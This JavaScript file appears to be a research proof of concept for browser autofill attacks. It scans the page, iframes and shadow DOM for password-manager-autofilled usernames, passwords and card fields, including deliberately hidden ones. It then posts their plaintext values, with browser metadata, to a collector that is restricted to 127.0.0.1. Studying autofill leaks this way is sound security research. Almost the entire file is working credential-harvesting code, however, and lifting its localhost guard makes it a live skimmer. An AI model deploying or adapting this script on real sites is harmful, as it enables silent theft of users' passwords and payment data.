/*
  thirdparty_poc_controls.js
  --------------------------------------
  Self-contained third-party (same-origin) script that:
   - Injects a controls panel (Enable checkbox, interval select, manual scan, Test ID inputs, log area)
   - Scans for autofilled inputs and constructs a JSONL-schema-ready payload
   - Posts ONLY to http://127.0.0.1:8088/collect (local collector)
   - Keeps plaintext samples optional (default true here to match your snippet; toggle via window.TP_SEND_VALUE_SAMPLE)
  Usage:
    <script src="/thirdparty_poc_controls.js"></script>
  Optional runtime knobs (define before loading the script):
    window.TP_SEND_VALUE_SAMPLE = true|false;
    window.TP_DEFAULT_INTERVAL_MS = 3000;  // 1500|3000|5000 typical
    window.TP_DEFAULT_ENABLE = false;      // start scanning enabled
    window.PWD_MANAGER = 'Chrome-built-in' // optional label for reports
*/
(function(){
  const LOCAL_COLLECTOR = 'http://127.0.0.1:8088/collect';
  const SEND_VALUE_SAMPLE = (typeof window.TP_SEND_VALUE_SAMPLE === 'boolean') ? window.TP_SEND_VALUE_SAMPLE : true;
  const DEFAULT_INTERVAL = Number(window.TP_DEFAULT_INTERVAL_MS || 3000);
  const DEFAULT_ENABLE = !!window.TP_DEFAULT_ENABLE;
  const USER_TZ = 'Asia/Taipei';

  // build UI container
  function h(tag, attrs={}, children=[]) {
    const el = document.createElement(tag);
    for (const [k,v] of Object.entries(attrs||{})) {
      if (k==='style' && typeof v==='object') Object.assign(el.style, v);
      else if (k==='text') el.textContent = v;
      else el.setAttribute(k, v);
    }
    for (const c of (children||[])) el.appendChild(typeof c === 'string' ? document.createTextNode(c) : c);
    return el;
  }

  const panel = h('section', { id:'tp-controls', class:'controls', style:{
    fontFamily:'system-ui, -apple-system, Segoe UI, Roboto, Helvetica, Arial, sans-serif',
    fontSize:'14px', lineHeight:'1.4', background:'#fcfffc', border:'1px solid #d7efd7', padding:'10px', margin:'12px 0'
  }}, [
    h('div', {style:{marginBottom:'6px', fontWeight:'600'}}, ['Third-party PoC Controls (local test only)']),
    h('label', {}, [
      h('input', { id:'tp-enableExfil', type:'checkbox' }),
      ' Enable PoC exfiltration (send only to 127.0.0.1:8088)'
    ]),
    document.createTextNode('  \u00A0\u00A0'),
    h('label', {}, [
      'Interval: ',
      (function(){
        const sel = h('select', { id:'tp-intervalSel' }, [
          h('option', { value:'1500' }, ['1.5s']),
          h('option', { value:'3000', selected:'selected' }, ['3s']),
          h('option', { value:'5000' }, ['5s']),
        ]);
        sel.value = String(DEFAULT_INTERVAL);
        return sel;
      })()
    ]),
    document.createTextNode('  \u00A0\u00A0'),
    h('button', { id:'tp-manualScan', type:'button', style:{marginRight:'8px'} }, ['Manual scan now']),
    h('span', {style:{marginLeft:'8px'}}, ['Test ID: ']),
    h('input', { id:'tp-testIdInput', type:'text', value:(function(){
      if (window.TEST_ID) return window.TEST_ID;
      const ymd = new Date().toISOString().slice(0,10).replace(/-/g,'');
      return 'thirdParty_sameOrigin_' + ymd;
    })(), style:{width:'240px'}}),
    h('button', { id:'tp-applyTestId', type:'button', style:{marginLeft:'6px'} }, ['Apply']),
    h('span', { id:'tp-testIdNow', style:{marginLeft:'10px', color:'#333'} }, []),
  ]);

  const logEl = h('pre', { id:'tp-log', style:{
    background:'#f7f7f7', padding:'10px', border:'1px solid #eee',
    maxHeight:'240px', overflow:'auto', margin:'6px 0 0 0'
  }});

  // mount UI near top of body
  (document.body ? Promise.resolve() : new Promise(r => addEventListener('DOMContentLoaded', r))).then(()=>{
    document.body.appendChild(panel);
    document.body.appendChild(logEl);
    // initialize enable checkbox text
    document.getElementById('tp-enableExfil').checked = !!DEFAULT_ENABLE;
    updateTestIdLabel();
    if (DEFAULT_ENABLE) startScanning(Number(document.getElementById('tp-intervalSel').value||3000));
    log('PoC loaded — start the collector on 127.0.0.1:8088, then enable PoC exfiltration if desired.');
  });

  function updateTestIdLabel(){
    const v = document.getElementById('tp-testIdInput').value.trim();
    document.getElementById('tp-testIdNow').textContent = v ? ('Current Test ID: '+v) : '';
    window.TEST_ID = v || window.TEST_ID || '';
  }

  // logging
  function log(msg) {
    const t = new Date().toLocaleTimeString('en-US', { hour12:false });
    logEl.textContent += `[${t}] ${msg}\n`;
    logEl.scrollTop = logEl.scrollHeight;
  }

  // UA parse (lightweight)
  function parseUserAgent() {
    const ua = navigator.userAgent || '';
    let browser = 'unknown';
    if (/Edg\/(\d+\.\d+)/.test(ua)) browser = 'Edge';
    else if (/Chrome\/(\d+\.\d+)/.test(ua) && !/OPR\//.test(ua)) browser = 'Chrome';
    else if (/Firefox\/(\d+\.\d+)/.test(ua)) browser = 'Firefox';
    else if (/Safari\/(\d+\.\d+)/.test(ua)) browser = 'Safari';
    return { browser, ua };
  }

  // selector helper
  function simpleCssPath(el) {
    if (!el || !el.ownerDocument) return null;
    const parts = [];
    let node = el;
    while (node && node.nodeType === 1 && node !== document.documentElement) {
      let part = node.tagName.toLowerCase();
      if (node.id) {
        part += '#' + node.id;
        parts.unshift(part);
        break;
      } else {
        const nm = node.getAttribute && node.getAttribute('name');
        if (nm) part += `[name="${nm}"]`;
        else if (node.classList && node.classList.length) {
          part += '.' + Array.from(node.classList).slice(0,2).join('.');
        }
        const parent = node.parentNode;
        if (parent) {
          const same = Array.from(parent.children).filter(ch => ch.tagName === node.tagName);
          if (same.length > 1) {
            const idx = Array.prototype.indexOf.call(parent.children, node) + 1;
            part += `:nth-child(${idx})`;
          }
        }
      }
      parts.unshift(part);
      node = node.parentNode;
    }
    return parts.length ? parts.join(' > ') : null;
  }

  // hidden detection
  let lastUserTypeAt = 0;
  document.addEventListener('input', () => lastUserTypeAt = Date.now(), {capture:true});
  const USER_TYPE_GRACE_MS = 2000;
  function isHiddenEl(el) {
    try {
      const rect = el.getBoundingClientRect();
      const style = window.getComputedStyle(el);
      return (
        style.visibility === 'hidden' ||
        parseFloat(style.opacity) === 0 ||
        style.display === 'none' ||
        rect.width === 0 || rect.height === 0 ||
        el.offsetParent === null ||
        el.getClientRects().length === 0 ||
        rect.left < -1000 || rect.top < -1000
      );
    } catch (e) { return false; }
  }

  // technique normalization
  function normalizeTechnique(raw) {
    if (!raw) return 'unknown';
    return String(raw).toLowerCase()
             .replace(/[:\/\s,+]+/g,'-')
             .replace(/[^a-z0-9\-()]/g,'')
             .replace(/\-+/g,'-')
             .replace(/^\-+|\-+$/g,'');
  }

  // collect inputs (document + same-origin iframes + known shadow host tags)
  function collectAllInputs() {
    const out = [];
    out.push(...Array.from(document.querySelectorAll('input[autocomplete]')));
    const iframes = Array.from(document.querySelectorAll('iframe'));
    for (const fr of iframes) {
      try {
        const idoc = fr.contentDocument;
        if (!idoc) continue;
        const inputs = Array.from(idoc.querySelectorAll('input[autocomplete]'));
        inputs.forEach(inp => inp.___in_iframe = fr);
        out.push(...inputs);
      } catch (e) {}
    }

    const shadowHosts = Array.from(document.querySelectorAll('x-shadow-host, x-tp-shadow, x-shadow-host-thirdparty-cdn'));
    for (const host of shadowHosts) {
      try {
        const sr = host.shadowRoot;
        if (!sr) continue;
        const inputs = Array.from(sr.querySelectorAll('input[autocomplete]'));
        inputs.forEach(inp => inp.___shadow_host = host);
        out.push(...inputs);
      } catch (e) {}
    }
    return out;
  }

  // find autofilled
  function findAutofilledInputs() {
    const inputs = collectAllInputs();
    const results = [];
    for (const inp of inputs) {
      try {
        const ac = (inp.getAttribute('autocomplete') || '').toLowerCase();
        if (!(ac.includes('username') || ac.includes('current-password') || ac.includes('new-password') || ac.includes('cc-'))) continue;
        const val = inp.value || '';
        if (!val) continue;
        if (Date.now() - lastUserTypeAt < USER_TYPE_GRACE_MS) continue;
        if (inp.dataset.exfiltrated === '1') continue;

        const hidden = isHiddenEl(inp);
        let rawTech = null;
        if (inp.dataset && inp.dataset.tech) rawTech = inp.dataset.tech;
        else if (inp.___in_iframe) rawTech = 'iframe';
        else if (inp.___shadow_host) rawTech = 'shadow-dom';
        else {
          const card = inp.closest && inp.closest('[data-tech], .card, .tp-card');
          rawTech = (card && card.dataset && card.dataset.tech) ? card.dataset.tech : 'in-document';
        }
        const tech = normalizeTechnique(rawTech);
        results.push({
          name: inp.name || inp.id || '?',
          value: val,
          hidden,
          node: inp,
          tech,
          inputType: inp.type || null,
          autocomplete: ac
        });
      } catch (e) {}
    }
    return results;
  }

  function isLocalHost() { return ['localhost','127.0.0.1'].includes(location.hostname); }

  async function safePostLocal(url, envelope) {
    if (!isLocalHost()) { log('Not local host; blocked sending.'); return { ok:false, status:'blocked-host' }; }
    if (!url.startsWith(LOCAL_COLLECTOR)) { log('Collector URL must be ' + LOCAL_COLLECTOR); return { ok:false, status:'bad-url' }; }
    const bodyStr = JSON.stringify(envelope);
    log('Sending payload: ' + bodyStr);
    try {
      const res = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: bodyStr,
        keepalive: true
      });
      const text = await res.text().catch(()=> '');
      if (!res.ok) { log(`Collector non-2xx: ${res.status} ${res.statusText} ${text}`); return { ok:false, status: res.status, text }; }
      log('Collector OK: ' + (text || '(no body)'));
      return { ok:true, status: res.status, text };
    } catch (e) {
      log('Send failed: ' + String(e)); return { ok:false, status:'network-error', err: String(e) };
    }
  }

  function redactValue(v) {
    if (v === undefined || v === null) return '';
    const s = String(v); return s.length > 200 ? s.slice(0,200) : s;
  }

  async function exfiltrateOnce() {
    const found = findAutofilledInputs();
    if (!found || found.length === 0) { log('Scan: no autofilled inputs found'); return; }

    const uaInfo = parseUserAgent();
    const testId = document.getElementById('tp-testIdInput').value.trim() || (window.TEST_ID || '');
    window._POC_TRIALS = window._POC_TRIALS || {};
    window._POC_TRIALS[testId] = (window._POC_TRIALS[testId] || 0) + 1;
    const trialNum = window._POC_TRIALS[testId];

    for (const f of found) {
      try { f.node.dataset.exfiltrated = '1'; } catch (e) {}
      const now = new Date();
      const local_ts = new Intl.DateTimeFormat('sv-SE', {
        year:'numeric', month:'2-digit', day:'2-digit',
        hour:'2-digit', minute:'2-digit', second:'2-digit',
        hour12:false, timeZone: USER_TZ
      }).format(now).replace('T',' ');
      const timestamp_utc = (new Date()).toISOString().replace(/\.\d+Z$/,'Z');

      const payload = {
        timestamp_utc,
        local_ts,
        test_id: testId,
        trial: trialNum,
        scenario: (f.node && f.node.___in_iframe) ? 'iframe' : 'in-document',
        injected_by: (f.node && f.node.dataset && f.node.dataset.provenance) ? f.node.dataset.provenance :
                     (f.node && f.node.closest && f.node.closest('[data-injected-by]')) ?
                     (f.node.closest('[data-injected-by]').getAttribute('data-injected-by')) : 'static-html',
        browser: uaInfo.browser,
        password_manager: window.PWD_MANAGER || 'unknown',
        field_name: f.name || null,
        input_type: f.inputType || null,
        autocomplete_attr: f.autocomplete || null,
        hidden: !!f.hidden,
        visibility_technique: f.tech || null,
        dom_selector: simpleCssPath(f.node) || null,
        autofill_triggered: true,
        detected_by_poc: true,
        value: SEND_VALUE_SAMPLE ? redactValue(f.value) : null,
        value_sample: SEND_VALUE_SAMPLE ? redactValue(f.value) : null,
        exfil_method: 'fetch-post',
        referrer: document.referrer || location.href,
        csp: (document.querySelector('meta[http-equiv="Content-Security-Policy"]') ? document.querySelector('meta[http-equiv="Content-Security-Policy"]').getAttribute('content') : null) || null,
        script_origin: location.origin,
        iframe_origin: (f.node && f.node.___in_iframe && f.node.___in_iframe.src) ? (new URL(f.node.___in_iframe.src, location.href).origin) : null,
        injection_time_ms: null,
        user_interaction_required: false
      };
      const envelope = { payload };
      log(`Found field ${payload.field_name} (hidden=${payload.hidden}, technique=${payload.visibility_technique}) — sending`);
      await safePostLocal(LOCAL_COLLECTOR, envelope);
    }
  }

  let timer = null;
  function startScanning(intervalMs) {
    stopScanning();
    timer = setInterval(() => {
      const enabled = document.getElementById('tp-enableExfil').checked;
      if (enabled) exfiltrateOnce();
    }, intervalMs);
    log(`Started scanning every ${intervalMs} ms`);
  }
  function stopScanning() {
    if (timer) { clearInterval(timer); timer = null; log('Stopped scanning'); }
  }

  // wire events
  document.addEventListener('click', (e) => {
    if (e.target && e.target.id === 'tp-manualScan') exfiltrateOnce();
    else if (e.target && e.target.id === 'tp-applyTestId') updateTestIdLabel();
  });
  document.addEventListener('change', (e) => {
    if (e.target && e.target.id === 'tp-enableExfil') {
      if (e.target.checked) startScanning(parseInt(document.getElementById('tp-intervalSel').value,10));
      else stopScanning();
    } else if (e.target && e.target.id === 'tp-intervalSel') {
      if (document.getElementById('tp-enableExfil').checked) startScanning(parseInt(e.target.value,10));
    }
  });

  document.addEventListener('visibilitychange', () => { if (document.hidden) { log('Page hidden — pausing scanning'); stopScanning(); } });

})();